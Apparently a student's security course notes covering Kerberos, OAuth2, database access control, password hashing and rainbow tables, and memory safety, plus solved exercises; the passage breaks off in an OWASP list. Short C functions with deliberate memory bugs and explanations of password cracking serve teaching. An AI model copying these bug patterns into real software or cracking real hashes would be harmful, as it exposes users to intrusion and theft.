##### Kerberos pre-authentication

Anybody can request a ticket for a user c from AS (they can brute force the password of session key)

To prevent this, pre-authentication can be used.

Microsoft uses pre-authentication.

##### Kerberos symmetric keys

the security of Kerberos relies on symmetric keys:

- the password hash of the user(s)
- the symmetric keys used to encrypt the tickets
  - between the AS and the TGS(s)
  - between the TGS and the server(s)

![Kerberos summary](Images/Screenshot%20from%202023-10-10%2017-24-44.png)

### Delegated authentication

#### OAUTH2

Oauth2 is a protocol used for delegated authentication on the Internet (Oauth2 providers like Facebook, Google, or Twitter can be used to authenticate and access other applications)

##### Roles

Client - application that wants to use authentication and possibly access the user's data

Resource server - server that has user's data that client wants to use

Authorization server - sever on whic hthe user authenticates

User - owner of account and resources on resource server

###### Typical Oauth2 flow

The client and the authentication server have a shared secret

- the client thus has to register with the authentication server before being able
  to offer this service
- the secret is used when the client exchanges the **authentication code** for an
  **access token**
- the authentication code is not sufficient to get access to the resources
- It can only be used by the client and nobody else

Oauth can be used by browsers or in apps

- in an app a redirection for authentication can be either
  - opening a browser within the app (called a webview)
    - not very safe as the app could be spying while you login
  - switching to the other app (e.g. facebook) and then back

##### Oauth2 authentication only

If Oauth is only used for logging in, then the flow can stop after getting access token and login

Most apps in smartphones do not store your password:
they use Oauth2 to reques an access token and use this
when you cange your password you don't need to type your new password into all your devices

### Authentication summary

Passwords can go a long way, especially if you use a password manager

For critical accounts, 2FA significantly raises the bar for attacker - U2F is secure and user-friendly

Challenge-response protocols authenticate a user without sending the password - can be vulnerable to MITM, in particular if there is no mutual authentication

Kerberos uses tickets to authenticate users across a network - authentication is separated from authorization

Oauth is used to delegate authentication on the internet - it has no crypto at all, relies on communications being made over TLS

Challenge-response protocols we have seen and Kerberos use symmetric crypto

## Exercises 3

**Exercise 1**
Explain what is the most important principle for access control in IT systems.

The most important principle is the least privilege principle. It mandates that each subject should
only have the minimum set of privileges required for it to fulfill its function

**Exercise 2**
What is the difference between ACLs and capabilities?

ACLs and capabilities both describe discretionary access rights that subjects have on objects.
With ACLs, the rights are attached to the corresponding objects. Capabilities are rights that are
attached to the corresponding subject (e.g. users or programs)

**Exercise 3**
Describe an advantage and a disadvantage of RBAC

RBAC makes it simpler to manage access rights.
• It is difficult to define roles that match the least privileges closely. So you either end up
having many slightly different roles or roles that are too liberal.

**Exercise 4**
Linux systems store password hashes and other information about user accounts in a file called
shadow. The file has the following access rights:

```shell
$ls -l /etc/shadow'
-rw-r––- 1 root shadow 1359 sep 24 22:13 /etc/shadow
```

• There is a program called unix_chkpwd that is owned by the user root and the group shadow.
It has the setgid bit set:
`-rwxr-sr-x 1 root shadow 38912 fév 14 2019 /usr/sbin/unix_chkpwd`
What could be the reason for the setgid to be set?

The program can be run by any user (see the last x in -rwxr-sr-x). The setgid bit means that
even when run by any user, it will run in the group shadow. This group has the right to read,
but not modify, the file /etc/shadow (see the second r in -rw-r-----). Thus, this program could
be used by any user for operations that only need to read the hashes but not modify them. For
example, it could check a user’s password, which is exactly what it is used for.
Here is a typical list of files with the setgid bit set on a Linux system.

```shell
find / -perm /g=s -group shadow -printf "%M %u %g %p\n" 2>/dev/null
root shadow -rwxr-sr-x /usr/bin/chage
root shadow -rwxr-sr-x /usr/bin/expiry
root shadow -rwxr-sr-x /usr/sbin/pam_extrausers_chkpwd
root shadow -rwxr-sr-x /usr/sbin/unix_chkpwd
```

**Exercise 5**
When mandatory access control (MAC) is used to protect the integrity of a system:
• Can a subject write to objects on levels above or below it (write-up or write-down)? Explain.
• Give an example of how an operating system can use MAC to protect its integrity.

• When protecting integrity, we want to prevent that subjects with lower integrity levels can
write to higher levels. Subjects can not write to levels above them (no write-up). The goal
is to preserve the integrity of the higher level objects.
• Processes that interact with the internet are assigned a low level of integrity. Only few
directories are assigned to that level. All other directories have higher levels and can not be
accessed by those processes. This is true even if the user owning the process has DAC rights
to write into these directories

**Exercise 6**
Consider the Universal 2nd Factor (U2F) authentication system.
• Explain why the name of the visited website is added to the information signed by U2F.
• Explain why a U2F second factor is better than an OATH based one time password (OTP).

• This makes sure that a fake website (e.g. playpal instead of paypal) can not play man-inthe-middle and ask you to sign a challenge it got from the original server.
• U2F uses signatures made with asymmetric keys. If the server were to be hacked, the attacker
would only find public keys and could note impersonate the user.

**Exercise 7**
Is a biometric authentication system with a false acceptance rate of 0.01% a good system?

The false acceptance rate (FAR) alone does not provide enough information to judge the quality
of a biometric authentication system. For example, the same system could have a false rejection
rate (FRR) of 80%, which would make it quite unusable
(Biometric authentication systems can be judged by their equal error rate (EER) which is reached
when the sensitivity is selected such that FER and FAR are equal.)

**Exercise 8**
Imagine that an attacker is able to intercept the service ticket and the encrypted session key
delivered by the TGS to a client.
• What are the mechanisms that prevent the attacker to use this information to obtain access
to the service mentioned in the ticket?

• The main protection is given by the encrypted session key. In order to obtain the service,
the client needs to produce an authenticator when presenting the ticket. To create this
authenticator the session key is required. The attacker only has the encrypted session key.
To decrypt it, they would need the session key of the previous step (which is the user’s
password hash).
• Additionally, the ticket contains the IP address of the client. The attacker could only use
the ticket if they were also capable of using the client’s IP address.

**Exercise 9**
Describe an attack that is possible in Kerberos if no pre-authentication is used.
Is this type of attack completely avoided with pre-authentication?

Without pre-authentication, anybody can ask the AS for a ticket granting ticket and an encrypted
session key. The session key of the TGT is encrypted with the password hash of the corresponding
user. An attacker can then try to bruteforce the user’s password by trying to decrypt the session
key with the hashes of possible passwords.
With pre-authentication, the user has to prove that they know the password hash by generating
an authenticator in order to receive a TGT.
The attacker can no more ask for some data that will allow them to crack the password. However,
if they are patient, they can wait until a user logs in and requests a ticket. If they can observe
the traffic, they can run the same attack or try to bruteforce the password from the authenticator.
The attack is still possible, but the window of opportunity is much smaller.

**Exercise 10**
When you change your password on the website of Twitter, you can still access Twitter from
you smartphone, without giving the new password. How is this possible?

Twitter uses Oauth2 to authenticate its users. When you installed twitter on your phone, you
had to give the password that was valid at that time. The twitter client used Oauth2 with your
user username and password to get an access token. That token is stored in your phone and gives
access to Twitter independently of any password change.
If you go to the “settings and privacy” page of your twitter account you can find all active tokens
on “Apps and sessions”. You can invalidate single tokens by cliking on “Log out the device shown”
for each session.

## Data Security

Data storage requirements are ubiquitous.

Companies must consider securiyt of data they store - EU idea is to store only what is needed, US store everything.

- what are security requirements of DB systems?
- what are main attack vectors of DB systems?
- what are main protections of DB systems?

Biggest Swiss privacy scandal - affair efisch - data stored of the citizens.

### Typical setups

on premises - internet -> firewall -> web server farm -> DB
in cloud - internet -> cloud server farm with DBs

### Multitier architecture

1. presentation tier (UI, web pages, interface)
2. application tier (logic - aoordinates application, processes, performs calculations, moves data)
3. data tier (storing and retrieveing from db or file system)

### Database access control

#### Layers

Layer - threat

- Hardware - a thief could take the disk or its backup
- OS - the sysadmin can access the files
- Database - administrators with privileged accounts they can access all data
- Network - hackers could connect to the DB remotely
- Application - ab applicaiton user can access data of other application users

Each layer must have a proper different access control

#### Hardware access control

if it is a physical machine in a data center - physical protection - locks, cameras, alarms

if it is a virtual machine in the cloud: cloning the machine is like stealing the hard disk, so limit the number of people who have the right to clone, use strong auth for your cloud management console, e.g. 2FA

#### OS access control

Database is run a userspace proces, so it is owned by OS user.

This user is the only one allowed to access the files of the database. And the data is stored in the directory of that DB, and its only allowed to be accessed by _mysql_ user, or any root

#### Discretionary DB access control

SQL databases use discretionary access control (DAC) to grant access to objects through privileges.

By default the root or system user has all privileges on all the objects.

To allow Alice read, modify or write the table or column, we can say "grant privileges (for columns) ON table to alice@localhost"

This data is stored in another table

There is a possibility to allow granularity at the row level by defining views: "CREATE VIEW Year_2023 AS SELECT \* FROM com402.students WHERE academic_year=2023"

**Role-based DB Access control**- SQL databases support roles

You can grant several roles to a same user, and they act as users.

#### Network access control

sometimes the applciation tier runs on the same machine as the DB. (then DB should be configured to listen to connections from localhost)

In other casesm the application tier runs on a different machine - accept connections only from machines that should talk to the DB (E.g. installing a firewall in from of the DB, or using a local firewall on the DB server, restricting users to certain IP addresses that can access the DB ("CREATE USER bob@10.2.2.3 ..."))

#### Application access control

applicaitons usually have their own layer of users and privileges - they use one or few DB accounts to interact with the DB

an e-banking application has 1K customers and three tables - a customer table with all customers and their password hashes, an account table with all accounts and their owners, a transaction table with all transactions of all accounts.

Access control is handled by the application - it uses the customer table for authenticaiton. It uses the other two tables to find the accounts and give permissions.

There could be a user who has access to all tables.

Potential flaws in this design:

- it does not follow the principle of least privileges
- prone to SQL injections
- it's a confidentiality problem - lack of compartmentalization and separation.

#### Example: SQL injection

An attacker can modify the SQL command by adding a closing the quote and adding additional command to get other data.

Separate code and data! - use %s for string parameters such that the statement could not change.

To limit the impact of them use different DB users for different accesses:

- one DB user with read access on the customer table (for login)
- user with write access on the customer table (for changing the users' password)
- user with the read access on the account table (customers cannot change the ownership of accounts)
- user with r/w access to the transaction table (For the actual application)

It's not exactly POLP byt it reduces the impact of SQL injection

In general using the different DB users is an application of the **defense in depth** principle
applicaiton uses a fine-grained access control
DB uses coarse grained
If the access control at the application level fails, the access control reduces the impact

### Encrypting the data

There are data at rest (hw, db), in use(application), in motion (network)

#### Encrypting data at rest

always encrypt the data before writing to the disk - protects against theft/copy of the disks, but does not protect against users.

DB can be configured to encrypt data before writing it to files. (Keys may be stored in local files or obtained from a key server)

Example use case - mobile phones.

#### Encrypting data in motion

if not encrypted it could be eavesdropped.

Use TLS, but also use certificate pinning

#### Encrypting data in use by the applicaiton

Solution to protect the data in memory of the DB is to encrypt the data in the application before storing it into the DB.

The key stays in the application tier -there is no way to decrypt the data on the DB server.

One way to read the memory is use volatility, cold boot attack.

**What could go wrong if the data is encrypted in the DB**:

- cannot serach with wildcards,
- sort, compare or aggregate data

useful only to find exact matches, e.g. high profile information

### Password storage

how to store passwords - store hashes.

Microsoft stores Windows passwords as hashes (MD4)
Almost all passwrods of length 8 can be recovered in under a minute

#### Hashing

classing way - use salt and iterations

- hugely slows down password cracking
- simple passwords can still be cracked on specialized hw

Modern way - use a memory hard function

- cracking a pass requires a decent amount of memory
- specialized hw with many cores do not have enough power

##### Importance of salt

SMBv1 (Microsoft) does not salt their password. Without salt same password will result in the same hash.

1. multiple hashes can be cracked at once
2. hashes can be calculated in advance (aka "rainbow table") (easy for 8letter passwords)

For each user we store a random component to compute the hash

Examples:

- WPA and WPA2 use the SSID as salt, and 4096 iterations of HMAC-SHA1
  - each test becomes expnsive
  - only simple passwords can be cracked
- kerberos pre-auth

##### Time-memory trade-off

when you double the memory, it is four times faster to invert the function

$T ~ \frac {N^2} {M^2}$

Rainbow tables are an optimization of this TMTO

Basic idea - organize hashes in chains

we agree on a set of passwords to crack

we create a reduction function r (collision free function that maps some hash to some pt): it takes a hash as input and produces a password from our set.

Then we build chains of hash-reduce, and we keep the first and the last element of each chain.
That is how we can save memory and we pay for this with more time to crack the passwords

To build this table we create four chains and only store the first and last elements.
Typically, the chains countaine order of 10k of hashes.

let's try to crack h6 that was leaked:
we check if h6 is a known end of chain - it is not
reduce and hash, find known hash, and loop around to the possible password.

By storing only the start and end of 4 chains we can crack any of the 10 passwords contained in the chains.

Hellman's original trande-off becomes a colision problem.

Solution is rainbow tables which has different reduction function used.

#### Storing hashes with salt and iterations

using salt prevents two issues - cannot crack multiple hashes with a single hash calculation and cannot calculate the hashes in advance

**What cryptographic primitive can we use to combine a salt with a hash** - concat

Salt is not enough - a simple way of slowing the attacker is to apply the hash function multiple times (because modern GPUS calculate hundreds of billions of hashes per second)

Salt standards - _password based key derivation function 2_

used in WiFi WPA, MacOS, Linux, etc.

#### Memory hard function hashin

##### Memmory hard function

purposefully hard to implement efficiently, it takes a lot of memory to compute.

Better password hash functions require a certain amout of memory (e.g. 16MB) - for one operation it's easy, but to crack is hard because it is paralelized.

The functions run through many steps and intermediate results are in memory, each step depends on results from previous steps.
If you do not have enough memory you can still recalculate the results.

Scrypt and Argon2

When implementing password storage:

- always use salt and make the hash function slow
- yescrypt, scrypt, argon2

#### Password storage in Linux

most distros switched to yescrypt (memory hard function)

the salt and hash are stored in /etc/shadow

"\$y\$" is the thype of hash

### Secure remote password protocol

PAKE allows to verify the password of a remote party, and exchange a key (e.g. for encryption)

PAKE is similar to Diffie-hellman but uses the symmetric key.

Password cannot be bruteforced because it is in exponents, and it's safe from eavesdropper.

## Exercises 4

**Exercise 1**
Your application uses an SQL database which stores the names, grades and year of graduation of students.
• What mechanism can you apply to allow user Alice to only read data of students that
graduate in 2025?

You can define a VIEW that only returns lines that contain the graduation year 2025. Then you can GRANT a privilege to user Alice to read from this view.
(The exact commands are:

```SQL
CREATE VIEW Year_2025 AS SELECT * FROM com402.students
WHERE graduation=2025;
grant SELECT ON Year_2025 to alice@localhost;
```

)

**Exercise 2**
Consider an application that contains medical data. For more security, it uses two different tables:
one with the personal data of patients and the other one with their medical conditions. Three database users are defined:

1. a user that can only read and write the personal data table
2. a user that can read the personal data and the medical data
3. a user that can read and write the medical data

The first user is used when patients update there personal data. The second user is used when the patients want to see their medical information. Finally, the third user is used when a doctor logs in to update the medical data.
• Which part of the application would have to be vulnerable to SQL injections, to allow a patient to read the medical information of another patient?
• What is a typical way of preventing an SQL injection?

The part of the application that lets a patient see their medical data uses a database user that has access to the complete table of medical information. If this part of the application is vulnerable to SQL injection, then a patient could modify an SQL request to show other patients’ medical data. Prepared statements are a typical technique to avoid SQL injection vulnerabilities

**Exercise 3**
• Why is transparent data encryption (the DB encrypts before writing to files) better than an
encrypted file system (the OS encrypts the content of the files)?

In the first case, the data can only be seen by database users that have sufficient privileges or by administrators of the server than can dump the memory of the database. In the second case, users of the operating system that do not have the right to access the database files can also see the data.

**Exercise 4**
• Give two reasons why it is important to salt password hashes.

A different salt per hash forces the attacker to crack each hash separately. They can not try to crack several hashes with a single hash calculation. A random salt prevents the attacker from calculating the hashes in advance.

**Exercise 5**
You just built a very nice rainbow table that can crack 99% of 8 letter passwords. Compared to a brute-force attack, it uses 1,000 times less hash operations to find a password. You are given a list of ten thousand hashes that need to be cracked.
• Is it going to be faster to crack the passwords with the rainbow table or with a classical
brute-force attack?

Although a rainbow table reduces the effort needed to crack a single password, it can not crack multiple passwords at a time. You have to search for the corresponding end of chain of each hash to crack. So cracking 10,000 passwords will be 10,000 times longer that cracking one password. If you have been able to build a rainbow table, this means that the passwords are not salted. Thus, a brute-force attack can hash all possible passwords only once and search for the corresponding hashes in the list of 10,000 hashes. So even if brute-force is 1,000 times slower, it will still be 10 times faster than 10,000 rainbow table runs.

**Exercise 6**
• Why calculating a Windows password hash (based on MD4) is about 200,000 times faster
than calculating a Linux password hash based on SHA512?

SHA512 is indeed more complicated to calculate than MD4 but the main part of the difference is due to the fact a Linux hash is calculated with thousands of iterations (typically 5,000). This very efficiently slows down the cracking process.

**Exercise 7**
• Why is a graphics card that can calculate 10,000 hashes in parallel, not efficient for cracking password hashes like Argon or Scrypt?

These hash functions are memory hard, which means that they need a certain amount of memory to be calculated efficiently. Although graphics card have many processing cores, they don’t have enough memory per core to calculate the hash efficiently.

## Programming languages security

### Motivation

Rust and safe programming languages.
There has been a push to have more Rust (android, linux etc)

Part of this push if google's 2/3 security rule:

- code that processes untrustworthy input
- code written in an unsafe language (C/C++)
- code without strong sandbox

Using a "safe" programming language makes rule unnecessary

#### Consequences of memory safety vulnerabilities

Those vulnerabilities that receive highest severity rating, are mostly memory-safety mvlnerabilities.

~70% of android's high severity vulnerabilities are of memory safety.

Android 13 roll-out most of its new code is in memory-safe language

Morris Worm was an attack on 1M lines of code and it was deemed to be too expensive to rewrite entire codebase in memory safe language (in 1988). Now it's several orders of magnitude more code and there are still problems

### Type safety

Type system is a system that assigns a **type** to every **term** (variable, expression, function)

Type of a **value** specidies which operations can be applied to
Type of a **variable** limits values that it can be assigned
Type of an **expression/function** delimits values it accepts and can produce

**Definition** - Well-typed programs cannot go wrong (a well-founded program cannot do anything that is not defined to do)

#### Static/Dynamic Typing

**Static** type system is checked by the compiler (or preprocessors) before program executes (C, Java, Go, Rust, OCaml)

- Type checker uses typing rules to determine type of all terms
- Compare inferred types against declared types and operations performed on values
- Mismatch is typing error

**Dynamic** type system tracks types of objects at runtime and prevents improper operations from being applied to them (python, javascript)

Dynamic will expose bugs and crashed during runtime, whereas static will show them at compile-time.

Advantages of Static:

- no runtime overhead
- find errors before program runs
- find all errors
- better for building reliable systems and groups of developers

Advantages of dynamic:

- more flexible
- fewer type declarations
- better for quick and dirty programming

#### Declared/Inferred types

Originally languages required full type declarations for all functions and variables, and compilers only infer expression types.

Hindly-Milner type inferece used in Haskell (spread into other languages)

#### Strict/Relaxed

Strict typing enforces typing and does not allow program to continue if the types don't match.

C is not strict.

#### Why is C Type system so ugly/flexible?

C was a thin layer over assembly language, designed by talented programmers for talented programmers. -> Machines were slow, memory was small

Type system did not constrain programmers or prevent them from using assembly language tricks.

Clearly successful, but times change - now the correctness and security are far more important and C's type system is not helpful.

#### Type safety and security

type checking is the only "automatic" bug detection technique in widespread use.

- Type system might prevent you from expressing something exactly in the manner you want
- it will not stop you from expressign a computation
- Problems found by sound type system are real errors: No false positives

In Java the programmer does not have access to direct memory and only access to objects and their representations.

#### Type confusion bugs are exploitable

Often when objects are being cast, there could be bugs which can be exploited.

Example - if there is a downcast from an inherited class to a narrower class. This violates memory safety.

### Memory safety

(is the monkey in the cage or outside?)

Memory safety is an essential programming language property.
Code can only access data within live regions of memory whose pointer is properly obtained.

In a safe language, runtime safety will inform about memory safety, in an unsafe language, the program might crash or might have some other behaviour (it is undefined behaviour).

**Definition** - memory safety ensures that only valid objects are accessed in bounds

**Spactil memory safety** - objets are only accessed in bounds. - after pointer arithmetic, the new pointer still points to the same object

**Temporal memory safety** - only valid objects are accessed. - the underlying object has not been freed.

These safeties are hard to achieve in systems programming languages.

#### Memory corruption

Unintended modification of memory location due to missing/faulty safety check.

```C
void vulnerable(int user1, int *array){
  //missing bound check for user1
  array[user1] = 42
}
```

#### Spatial memory safety error

the pointer is updated to point oustide of the valid object
the pointer is used to dereference invalid memory

(if you're lucky, the program will crash, if unlucky the program will overwrite some data)

```C
void vulnerable(){
  char buf[12];
  char *ptr = buf[11];
  *ptr++ = 10;
  *ptr = 42
}
```

#### Temporal memory safety error

the referenced object is freed and no longer "live"
the pointer is used to dereference invalid memory

```C
void vulnerable(){
    free(buf);
    buf[12] = 42;
}
```

#### Implementation

- Bounds checking
  - check that every indexed memory reference is within array boudns
  - compiler optimizations can eliminate some runtime checks
- Lifetime tracking
  - use after free is not allowed
  - double free is not allowed
  - memory leakage is bad (but allowed)
- Automated storage reclamation
  - garbage collection
  - reference counting
  - smart pointers/borrow checking

##### Bounds Checking

every region of memory has a length associated with it

C's interior pointers make tracking more complex (Java does not allow them)

Verify that every memory access in in-bounds

One of the difficulties in C is that you can create internal pointers.

In a smart compiler no check is necessary every loop iteration since it can determine that value of i is within array before the loop using language semantics.

##### Overhead of bounds checking

Overhead for enforcing spatial memory safety for C code is significant (softbound reported 67% overhead, it is due to a lot of additional metadata needed to control this and for each memory access you need to do 2-3 more checks)

Overhead for Java is not nearly as large (it is reported 3-10% on small benchmarks) and similar was found for Rust. This is because the size of the object can be stored in the object itself.

##### Automated Storage reclamation

reclaim and reuse memory that will not be accessed in future execution - conservative approximation - reclaim memory when it's not reachable

Prevent errors with manual reclamation (malloc/free):
double free, use after free or not freeing.

Many algorithms: refernce counting, garbage collection.

##### Temporal memory safety and security

double free is an **integrity** concern - data structures of the allocator may serve as arbitrary write primitive

Missing free is an **availability** concern - basis for denial-of-service attack (when memory is used up and program crashes)

##### Reference counting

every block of memory maintains a count of numbers of pointers to it:
1 when block is allocated
+1 copying pointer
-1 dropping pointer

Conceptually simple but fidgety to implement

Memory freed immediately when last pointer is dropped (count = 0)

#### Garbage collection (GC)

When program is running out of space on heap, stop and run collector to find uncreachable objects.
Pauses program execution
Uncollected garbage increases memory requirements
may be less expensive than RC
Collects unreachable cyclic structures.

One of the simplest - **Mark-And-Sweep GC**.
First phase is marking where we start with the root set and then recursively go through the objects and mark them.
Second phase is going through the whole heap and removing unmarked objects.

It can be implemented for C and C++, conservatively scanning for pointers.

##### GC overhead

GC overhead is difficult to measure

Has a reputation for being significant

More troublesome is unpredicatble interruptions (there are pause-free GCs)

#### Rust

Safe programming language (type and memory)

Ownership types reduce need for runtime gc (also allows unsafe code)

For low-level programming - efficient code, no gc, optional reference counting.

Becoming popular for systems programming - already in use for the Linux kernel, Android, Firefox.

##### Rust Ownership

Variables **own** the value they are bound to (contain)

When variable goes out of scope, vlaue is deallocated (similar to C++ smart pointers)

Key restriction - exactly 1 variable can be vound to a value.

Why?:
Value’s lifetime is same as variable’s lifetime
Also, Rust allows destructive operations on values

Also Rust allows Borrowing with a requirement that the lifetime of a borrower is longer than the borrowing function.
Immutable reference borrowing.

Read/Write restriction - it is useful in concurrent code to prevent data races.

##### Rust reference counting

Lifetime of objects is tied to variable's scope
(sometimes this does not work e.g. trees, graphs)

Rust also allows reference counted smart pointers

##### Unsafe code

rust also allows unsafe code that would not pass borrow checker
put unsage code in module and wrap in sage interface

Almost all non-trivial data structures implemented this way

Easier to undetand and hand-verify a small amount of code that explicitly is marked unsafe

### Thread safety

Examples of concurrency bugs:

- race conditions
- deadlocks

Example of concurrency bugs - dirtycow

Very hard to find

#### DirtyCoW

a local privilege escalation attack that exploits a race condition in the linux kernel's memory-management subsystem
CoW - copy on write, a mechanism for efficiently sharing modifiable data.

#### In programming languages

Modern languages include type-safe synchronization primites - locks, semaphores, atomic vars

##### Thread safety in Java

In Java, the `synchronized` keyword is used in the declaration of a method to acquire locks.

##### Thread safety in Go

It has Goroutines: green threads created by the go runtime, cheap and fast

It has channels - means of communication between goroutines, data is copied from one end of the channel to another.

##### Thread safety in Rust

Ownership guarantees memory safety.

Either one thread that writes or multiple threads that read the data.

### Sandboxing and comparmentalization

POLP ensures that a component has the least privileges needed to function

#### Sandboxing

implements POLP by running programs (often untrusted code) in an isolated, restricted environment

is usually a implementation feature of programming languages instead of design feature

system calls:
seccomp
cgroup

##### Sandboxing example

Flash\*, JS, WebAssembly inside the browser

Interpreters (ghostscript/VBA macors) embedded inside word processors

Without explicit permission from the user, opening a web page or document shouldn't leak secrectsin your local hard disk.

The premise of sandboxing providing security relies entirely on the implementation of sandbox.

**Flash and VBA macros** used to be security nightmares

JS interpreter bugs remain a shource of critical browser vulnerabilities.

#### Compartmentalization

can enforce POLP

break a complex system into small components, limit the access of entities to only what is necessary.

Prevent error propagation in the system to diminish impact.

Sandboxing is an implementation of this.

##### Chromium

**Sandboxed render engines** - cannot affect the world, except via the exposed AP

Start process, establish IPC channel
Drop all access privileges
Do not require admin rights

If a webpage crashes, it does not affect the system

**Browser kernel API** - decide how render engines influence the outside world

Available channels:
User interaction
Storage
Network

#### Compartmentalization in PL

what should a basic entity be - functions, libraries? (component)

How should each component interact with each other? (policy)

## Exercises 5

**Exercise 5.1**
Explain type safety and memory safety.

Type safety ensures that only type-appropriate operations are applied to values during a program’s execution. C-style casts allow arbitrary type casts, relying on the programmer to ensure the cast is valid. In C++, upcasting a class pointer to a base class pointer is safe, but downcasting a base class pointer to a derived class pointer can be unsafe. For instance, if classes B and C both inherit from class A, a pointer to a B object can be safely cast to a pointer to an A object, but casting that pointer to class C is unsafe.

Memory safety ensures that only live memory regions are accessed through a properly acquired (in-bound) pointer. Examples of memory safety violations include out-of-bounds array accesses and use-after-frees

**Exercise 5.2**
Is type safety necessary to reduce security vulnerabilities?

Yes. Type safety helps to prevent certain software defects that could be exploited in attacks. The lecture slides demonstrate that a type confusion bug can be exploited in the Chrome browser.

Additionally, memory safety requires type safety to ensure an object’s class type can be checked, confirming that a struct or object field reference is legal.

**Exercise 5.3**
Why would a software developer prefer to use a safe programming language? Why would a developer prefer an unsafe programming language?

A developer should prefer a safe programming language if they are developing software with a publicly exposed attack surface because language safety can prevent many types of software defects, such as buffer overruns (Google’s “rule of 2”). Developers might also prefer safe languages as they can aid in writing robust and reliable software by exposing software defects.

A developer might prefer an unsafe programming language because they believe it allows writing more efficient code, optimizing a computer’s processor and memory usage.

**Exercise 5.4**
Does language safety impose a burden on a software developer?

Yes, but it is a necessary burden. Safety requires developers to ensure that their programs’ types and pointer references conform to a language’s rules. These rules ensure programs behave predictably and according to language semantics without corrupting data or performing ill-defined operations. Safe languages facilitate this by helping developers identify defects with compiler and runtime error messages. While it’s possible to write correct programs in unsafe languages, it’s more challenging without compiler and runtime assistance. There are cases where a program with type or memory errors might produce the “right” answer, but such errors can cause the program to misbehave with other inputs.

**Exercise 5.5**
What are the advantages and disadvantages of the memory reclamation techniques discussed in the lecture?

Manual memory allocation and deallocation (e.g., malloc/free in C) grant a developer complete control over object lifetimes, potentially optimizing a program’s memory usage. However, accurately tracking object lifetimes is complex and prone to errors, which can introduce defects.

Reference counting effectively reclaims non-cyclic data structures. With efficiency improvements through language and compiler assistance, it reclaims objects when they first become unreachable, without long pauses. However, explicit cycle breaking is required for full memory reclamation. Garbage collection has potentially lower performance overhead than reference counting and can reclaim cyclic data structures. It might also improve program performance by compacting data structures to fit the processor cache better. However, garbage collection usually introduces pauses in program execution to scan memory, which might be unsuitable for certain applications.

Ownership and borrowing (as in Rust) tie object lifetimes to variable scopes. Like smart pointers in C++, they release an object when its encompassing variable goes out of scope. While ownership incurs a low cost, it might not meet all allocation and deallocation requirements, even with borrowing. Rust also offers reference counting for data structures whose lifetimes aren’t tied to a specific variable.

**Exercise 5.6**
Give examples for violations of spatial and temporal memory safety. Explain how modern programming languages prevent such violations.

Spatial memory safety violations involve accessing memory locations that a program shouldn’t, such as out-of-bounds array accesses. Temporal memory safety violations occur when a program accesses memory at a time it shouldn’t, like accessing memory after it has been freed (use-afterfree), double freeing memory, or returning a pointer to a local (stack) variable.

Modern programming languages employ various techniques to prevent these violations. For spatial memory safety, many languages enforce bounds checking to ensure data is accessed within its allocated space. For temporal memory safety, languages may use techniques like garbage collection (as seen in Java) or ownership and borrowing systems (as in Rust) to manage memory access and deallocation

**Exercise 5.7**
Explain static/dynamic typing. What are their advantages and disadvantages?

Static typing checks types at compile time, whereas dynamic typing checks types at runtime.

Advantages of static typing: (1) Can catch type errors early, often leading to more robust software. (2) Can lead to performance optimizations since type information is available at compile-time. (3) Provides clearer documentation via type annotations, helping developers understand code better.

Disadvantages of static typing: (1) Can be more verbose as type annotations are usually required. (Type inference can help reduce verbosity) (2) Might require additional boilerplate, e.g., using templates in C++ for generic programming.

Advantages of dynamic typing: (1) Provides flexibility and allows for rapid prototyping. (2) Reduces verbosity as type annotations are often optional.

Disadvantages of dynamic typing: (1) Typing errors can only be detected at runtime, which can be problematic for large and complex programs. (2) Absence of type annotations can make code harder to understand and maintain.

**Exercise 5.8**
Compare and contrast dynamic typing and loose (weak) typing.

Dynamic typing pertains to when type checking occurs: at runtime. Loose (or weak) typing, on the other hand, describes how strictly type rules are enforced allowing for more implicit type conversions.

It’s essential to understand that dynamic typing and weak typing are orthogonal concepts. A language can be dynamically typed and either strictly or loosely typed. For instance, Python is both dynamically and strictly typed because, while type checking happens at runtime, it enforces type rules rigorously. Conversely, C is statically and weakly typed, as it allows arbitrary pointer casts, implicit type conversions and performs type checks at compile-time.

**Exercise 5.9**
Do modern programming languages provide full guarantee for thread safety?

No, modern programming languages do not provide a "full guarantee" for thread safety. Thread safety is about ensuring multiple threads can access shared resources without causing unintended behaviors or data inconsistencies. Although many modern languages offer features and constructs (like ‘synchronized‘ in Java, goroutines and channels in Go, and ownership in Rust) to aid in achieving thread safety, these are tools and not guarantees. For example, while modern programming languages offer locks in their standard libraries, there’s no assurance that programs using these languages will be free of deadlocks.

**Exercise 5.10**
Explain the principle of least privilege, sandboxing, and compartmentalization in your own words.
Show how they relate to each other.

The principle of least privilege dictates that a user, program, or process should possess only the minimum privileges needed for its function.

Sandboxing is a security technique wherein a program or process operates in a restricted environment with limited resource and system function access.

Compartmentalization involves dividing a system into isolated sections, ensuring a breach in one doesn’t compromise another.

Both sandboxing and compartmentalization help enforce the principle of least privilege by restricting program or process privileges to only those necessary. In a programming language context, compartmentalization is often more fine-grained, operating at function or library levels, whereas sandboxing is more coarse-grained, limiting access at the process level.

## Web and software security

CVE - unique identifier for a vulnerability (vunerabilities and exposures)
CWE - unique identifier for a class of vulnerabilities (weakness enumeration)

### OWASP Top 10

1. Broken access control
   1. failures lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits
   2. CWEs: exposure of sensitive information to an unauthorized actore, Insertion of sensitive information into sent data, cross-site request forgery
   3. Solutions - reduce attack surface by "deny by default", log access control failures, and rate limit API calls.
   4. Difficulty - keeping track of what you have installed and that it does not allow escalation of access.
2. Cryptographic failures
   1. CWEs: Use of hard-coded ("default") password, Broken or Risky Crypto algorithm, Insufficient Entropy
   2. Solutions: reduce attack surface by storeing minimal data
   3. Ensure up-to-date algorithms and implementations
   4. Disable legacy protocols
3. Injection
   1. It is possilbe when attacker controlled data is handled incorrectly and ends up being parsed as code.
   2. CWEs: XSS, SQL injection, External control of file name or path
   3. Solutions: reduce attack surface by shifting to safe API, sanitize user input through validation and escaping , validate input whenever possible, escape remaining characters when necessary.
   4. It is extremely difficult to detect that on the browser/user side, because websites already use a lot of resources from other websites
4. Insecure design
   1. it is broad category representing different weaknesses.
   2. CWEs: Generation of Error Message containing sensitive information, Unprotected storage of credentials, Trust boundary violation, Insufficiently protected credentials.
   3. Solutions: prevent by establishing secure development lifecycle, use threat modeling where feasible, segregate and compartmentalize where possible
5. Security Misconfiguration
   1. Admins need to carefully balance features and security. Any software along a complex stack may be misconfigured.
   2. CWEs: Configuration, Improper restriction of XML external entity reference
   3. E.g. configuring email server
   4. Solutions: document the software stack and its configuration, harden all configuration, minimize exposed features.
6. Vulnerable/Outdated Components
